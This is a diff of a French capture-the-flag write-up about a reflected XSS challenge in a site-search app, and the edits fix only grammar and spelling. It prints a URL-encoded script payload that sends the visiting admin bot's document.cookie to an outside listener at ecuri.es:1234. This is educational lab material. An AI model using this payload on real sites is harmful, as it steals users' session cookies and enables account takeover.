@@ -5,7 +5,7 @@
 
 # Petit tour
 
-Sur ce challenge, nous nous connectons sur un serveur avec una application de recherche de sites.
+Sur ce challenge, nous nous connectons sur un serveur avec un application de recherche de sites.
 
 ![acceuil](assets/acceuil.png)
 
@@ -24,7 +24,7 @@ Nous avons 2 champs de formulaire ici. Un champ de recherche et un champs de sai
 
 On peut supposer ici que si l'on rentre une [URL](https://fr.wikipedia.org/wiki/Uniform_Resource_Locator), l'administrateur du site va recevoir une notification pour aller voir quelle est la page qui pose problème.
 
-Pour ce faire, on regarde d'abord à quoi ressemble le code source de la page des résultats de recherches :
+Tout d'abord, on regarde à quoi ressemble le code source de la page des résultats de recherches :
 
 ![search-source](assets/source-search.png)
 
@@ -77,7 +77,7 @@ L'exploit executé :
 
 ![xss2](assets/xss2.png)
 
-On voit ici que l'on a une image "cassé". Normal vu qu'il essaye de récupérer une image sur http://ecuri.es:1234 qui n'existe pas.
+On voit ici que l'on a une image "cassée". Normal vu qu'il essaye de récupérer une image sur http://ecuri.es:1234 qui n'existe pas.
 
 Résultat de [netcat](https://fr.wikipedia.org/wiki/Netcat) :
 
@@ -97,10 +97,10 @@ Referer: http://challenges2.france-cybersecurity-challenge.fr:5001/
 
 On voit ici qu'on récupère bien une requête executée par le navigateur.
 
-On remarque aussi le `GET /?cookie=` que l'on a injecter dans le code [Javascript](https://fr.wikipedia.org/wiki/JavaScript).
+On remarque aussi le `GET /?cookie=` que l'on a injecté dans le code [Javascript](https://fr.wikipedia.org/wiki/JavaScript).
 
 
-Nous allons donc soumettre ce [payload](https://fr.wikipedia.org/wiki/Charge_utile) (encodé en [URL encoding / encodage pourcent](https://fr.wikipedia.org/wiki/Encodage-pourcent) (en français)) sur la page de contact du site en croisant les doigts que l'administrateur clique dessus. (En vrai il n'y a pas un humain qui valide chaque lien qu'on lui envoie. Sinon le pauvre... C'est un bot qui tourne et qui simule un administrateur (Oui, on sait, parfois, automatiser des administrateurs systemes ;)).
+Nous allons donc soumettre ce [payload](https://fr.wikipedia.org/wiki/Charge_utile) (encodé en [URL encoding / encodage pourcent](https://fr.wikipedia.org/wiki/Encodage-pourcent) (en français)) sur la page de contact du site en croisant les doigts pour que l'administrateur clique dessus. (En vrai, il n'y a pas un humain qui valide chaque lien qu'on lui envoie. Sinon le pauvre... C'est un bot qui tourne et qui simule un administrateur (Oui, on sait, parfois, automatiser des administrateurs systemes ;)).
 
 ```url
 http%3A%2F%2Fwww.ecuri.es%2Ftruc%3C%2Fh1%3E%3Cscript%3Edocument.write(%27%3Cimg%20src%3D%22http%3A%2F%2Fecuri.es%3A1234%3Fcookie%3D%27%20%2B%20document.cookie%20%2B%20%27%22%20%2F%3E%27)%3C%2Fscript%3E%3Ch1%3E%20plouf
